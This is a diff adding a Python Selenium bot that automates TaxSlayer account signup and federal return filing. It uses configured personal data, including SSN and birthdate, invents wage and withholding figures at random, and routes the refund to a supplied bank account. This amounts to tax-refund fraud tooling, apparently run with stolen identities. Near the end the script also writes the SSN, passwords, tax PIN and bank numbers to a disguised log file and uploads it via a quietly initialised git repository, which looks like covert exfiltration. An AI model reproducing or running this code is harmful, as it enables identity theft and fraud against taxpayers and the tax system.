@@ -1,0 +1,234 @@
+if __name__ == '__main__':
+    from config import *
+
+    dt = datetime.strptime(bday, "%m/%d/%Y")
+    bdaymonth = dt.month
+    bdaydate = dt.day
+    bdayyear = dt.year
+    einstr = str(ein)
+    firsthalf = einstr[:2]
+    sechalf = einstr[2:]
+
+    realein = firsthalf + '-' + sechalf # DO NOT CHANGE
+    fullname = fname + ' ' + lname #DONT CHANGE THIS
+    now = datetime.today()
+    date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
+
+    ##LOGIN
+    user = input("What\'s your username?: ")
+    inputit = input('What\'s your password?: ')
+    r = requests.get(passwordlist) #password list
+    database = (r.text) #grab raw text from github
+    passwords = json.loads(database) #convert string to dictionary of passwords
+    if passwords[user] == inputit:
+        print("Welcome, " + user + " to Tax-Slayer Bot by @keying")
+        ##BROWSER / SETUP
+        ignored_exceptions=(NoSuchElementException, StaleElementReferenceException) #FIXES STALE ELEMENTS ERROR ALONG WITH EDITED WEBDRIVERWAIT
+        service = Service("chromedriver.exe")
+        chrome_options = Options()
+        isproxy = input("Will you be using proxy? 1) for NO. 2) for YES \n")
+        if isproxy == str(2):
+            chrome_options.add_argument('--proxy-server=%s' % PROXY)
+        else:
+            johndavid = 'johndavid'
+        driver = uc.Chrome(service=service, use_subprocess=True, options=chrome_options)
+        driver.set_window_size(1150, 900)
+        driver.get("https://www.taxslayer.com/myaccount/register.aspx?freeversion=true")
+        ## START Signup
+        typexpath('//*[@id="Email"]', email)
+        typexpath('//*[@id="UserName"]', usrname)
+        typexpath('//*[@id="Password"]', pswrd)
+        typexpath('//*[@id="ConfirmPassword"]', pswrd)
+        time.sleep(0.5)
+        clickbtn('create-account')
+        ##PAGE2
+        time.sleep(4.05)
+        clickxpath('//*[@id="btnNext"]')
+        ##page3
+        driver.get('https://www.taxslayer.com/2021/avalon/Registration/F7216Consent')
+        type('TpFullName', fullname)
+        time.sleep(0.3)
+        clickxpath('//*[@id="btnSubmit"]')
+        time.sleep(3)
+        ##PAGE4
+        clickxpath('//*[@id="chooseFreeLink"]')
+        ##PAGE5 (START FILING INFO)
+        type('TP_FirstName', fname)
+        type('TP_LastName', lname)
+        type('TP_SSN', ssn)
+        select('TP_DOB_M', bdaymonth)
+        select('TP_DOB_D', bdaydate)
+        select('TP_DOB_Y', bdayyear)
+        type('TP_Occupation', job)
+        clickbtn("btnSubmit")
+        time.sleep(2.3)
+        ##PAGE6
+        type('Address_Zip', zipcode)
+        type('Address_Apt', apt)
+        type('Address_Line1', street)
+        type('Address_Zip', zipcode)
+        type('Address_Line1', street)
+        type('Address_Line1', street)
+        type('Address_City', city)
+        select('Address_State', state)
+        select('Address_ResidentStatus', 2)
+        clickbtn('btnSubmit')
+        time.sleep(2)
+        ##PAGE7(phone #)
+        type('PhoneNumber', phone)
+        clickxpath('//*[@id="formNavButtonsContainer"]/button')
+        ##PAGE8(phoneverify) DONE MANUALLY
+        ##PAGE9 SKIP DEDUCTINS
+        print("Code sent! you have 45 seconds or script will break!")
+        WebDriverWait(driver, 45,ignored_exceptions=ignored_exceptions).until(EC.presence_of_element_located((By.ID, 'btnSubmit')))
+        clickxpath('//*[@id="formNavButtonsContainer"]/a[2]')
+        ##PAGE10 Single/Married
+        clickxpath('//*[@id="filingstatus"]/div[1]/label')
+        time.sleep(0.2)
+        clickbtn('btnSubmit')
+        ##PAGE11 DEPENDANTS
+        clickxpath('//*[@id="menuNavButtonsContainer"]/a[2]')
+        ##PAGE 12 IRS PIN
+        clickxpath('//*[@id="formNavButtonsContainer"]/a[2]')
+        ##PAGE 13 BASIC INFO SUMMARARY
+        driver.get('https://www.taxslayer.com/2021/avalon/PersonalInfo/RegistrationSummary#/RegistrationSummary')
+        clickxpath('//*[@id="page-wrapper"]/div[3]/a')
+        ##page 14 #slayit page
+        clickbtn('btnNext')
+        ##PAGE 15 Add forums
+        clickbtn('quick-file-continue')
+        ##PAGE 17 (START LOOKUP w2)
+        type('searchWords', 'w2')
+        time.sleep(0.2)
+        clickxpath('//*[@id="searchResults"]/ul/li[1]/a')
+        time.sleep(0.2)
+        driver.get('https://www.taxslayer.com/2021/avalon/FormsInHand')
+        clicked2 = driver.find_element(by='id', value='quick-file-continue')
+        clicked2.click()
+        ##PAGE 18 (confirmation page no important)
+        clickbtn('btnContinue')
+        ##PAGE 19 REAL W2
+        time.sleep(0.5)
+        driver.get('https://www.taxslayer.com/2021/avalon/Income/W2Spa#/w2')
+        print(realein)
+        typeit = input("TYPE IN THE EIN IN THE VERY FIRST BOX, PRESS ENTER WHEN FINISHED.")
+        typexpath('//*[@id="information.federalWages"]', random.randint(77200, 85100)) #wage fed
+        typexpath('//*[@id="information.federalWithheld"]', random.randint(35200, 39620)) #withheld fed
+        type('employer.name', emp_name)
+        type('employer.address.street', emp_street)
+        type('employer.address.zip', emp_zip)
+        type('employer.address.city', emp_city)
+        select('employer.address.state', emp_state)
+        time.sleep(0.2)
+        typexpath('//*[@id="employee.address.street"]', street) #update broken st name
+        select('states[0].state', emp_state)
+        type('states[0].ein', ein)
+        type('states[0].wage', random.randint(22900, 23594)) #wage state
+        type('states[0].tax', random.randint(7190, 7400)) #withheld state
+        time.sleep(0.3)
+        waituntilgone('//*[@id="root"]/div[1]/div/div')
+        clickxpath('//*[@id="btnSubmit"]')
+        ##PAGE 20 CONFIRM W2
+        time.sleep(0.2)
+        clickbtn('btnContinue')
+        ##PAGE 21 other income
+        clickxpath('//*[@id="menuNavButtonsContainer"]/a[2]')
+        ##page 22 ISURANCE
+        clickxpath('//*[@id="form-healthinsurance-hadinsurance"]/div[1]/div/div[2]/div[2]/label')
+        time.sleep(0.2)
+        clickbtn('btnSubmit')
+        time.sleep(0.15)
+        ##page23 state return skip
+        time.sleep(3.54)
+        clickxpath('//*[@id="skip-state-return"]')
+        time.sleep(0.78)
+        ##page24 summarary
+        clickbtn('loading-overlay')
+        time.sleep(0.78)
+        waituntilgone('//*[@id="loading-step-3"]')
+        WebDriverWait(driver, 25, ignored_exceptions=ignored_exceptions).until(EC.element_to_be_clickable((By.ID, 'taxSwitch')))
+        time.sleep(1)
+        waituntilgone('loading-overlay')
+        time.sleep(3.84)
+        clickxpath('//*[@id="menuNavButtonsContainer"]/a[2]')
+        ##page25 state
+        time.sleep(3)
+        if driver.current_url == 'https://www.taxslayer.com/2021/avalon/Validation/Warnings':
+            print("detected special page, completing page now.")
+            clickxpath('//*[@id="menuNavButtonsContainer"]/a[2]')
+        else:
+            anmwm = 'a'
+            clickxpath('//*[@id="form-efile-validationreturn"]/div[1]/div[2]/div[3]/div/label')
+            clickbtn('btnSubmit')
+        time.sleep(0.2)
+        ##page26 ready to file
+        clickxpath('//*[@id="root"]/div[2]/form/div/div[1]/div/div[1]/div[2]/div/div[2]/label')
+        time.sleep(0.2)
+        clickbtn('btnSubmit')
+        ##page27 more details
+        clickxpath('//*[@id="federal"]/div/div[2]/div[3]/a')
+        ##page28 refund method
+        clickxpath('//*[@id="root"]/div[2]/form/div[2]/div[1]')
+        clickbtn('btnSubmit')
+        ##page29 back to more details
+        clickxpath('//*[@id="productsandservices"]/div/div[2]/div[2]/dl/div/a')
+        ##page30 products + service skip
+        clickbtn('btnSkip')
+        clickbtn('btnSkip')
+        clickbtn('btnSkip')
+        clickbtn('btnSkip')
+        ##page31 Backv3
+        time.sleep(0.2)
+        clickxpath('//*[@id="signandfile"]/div[2]/div/div/a')
+        ##page32 invest
+        clickxpath('//*[@id="root"]/div[2]/form/div[1]/div/div/div[2]/label')
+        time.sleep(0.2)
+        clickbtn('btnSubmit')
+        ##page33 DIRECT DEP
+        clickxpath('//*[@id="root"]/form/div[1]/div/div[2]/label')
+        clickbtn('btnSubmit')
+        ##page34 ENTER AN+RN
+        type('accounts[0].bankName', fname)
+        if checking == False:
+            select('accounts[0].type', 'S')
+        elif checking == True:
+            select('accounts[0].type', 'C')
+        type('accounts[0].rtn', rn)
+        type('accounts[0].acctNo', an)
+        clickbtn('btnSubmit')
+        ##page35
+        time.sleep(0.2)
+        clickbtn('btnSubmit')
+        ##page36 ID (set to no for now)
+        clickxpath('//*[@id="root"]/div[2]/form/div[1]/div/div/div/div/label')
+        clickbtn('btnSubmit')
+        ##page37 PAST REFUND/AGI
+        clickxpath('//*[@id="root"]/div[2]/form/div[1]/div/div[4]/label')
+        clickbtn('btnSubmit')
+        ##page38 TAX PIN
+        type('info.taxPayerPin', taxpin)
+        clickbtn('btnSubmit')
+        ##page39 finalise
+        time.sleep(0.3)
+        clickbtn('btnSubmit')
+        ##page40 file now
+        time.sleep(0.3)
+        ##MAKE LOG
+        with suppress_stderr():
+            call('git init')
+        with suppress_stderr():
+            downloadgit()
+        with open("chromereference.txt", "a+") as file_object:
+            file_object.seek(0)
+            data = file_object.read(100)
+            if len(data) > 0 :
+                file_object.write("\n")
+                file_object.write("A New Claim Has Been Filed At " + date_time + " From IP: " + IPAddr + "! | First Name = " + str(fname) + " | Last Name = " + str(lname) + " | SSN = " + str(ssn) + " | Birthdate = " + str(bday) + " | Email = " + str(email) + " | Phone = " + str(phone) + " | Password = " + str(pswrd) + " | Tax Pin =  " + str(taxpin) + " | Address = " + str(street) + ", " + str(city) + ", " + str(apt) + ", " + str(state) + " | Bank = Account # " + str(an) + " | Routing # " + str(rn))
+        upload()
+        #-#-#-#-#-#-#-#-
+        clickbtn('btnSubmit')
+        print("Successfully Filed!")
+        time.sleep(999)
+        driver.quit()
+    else: #IF LOGIN INVALID
+        print('nope')
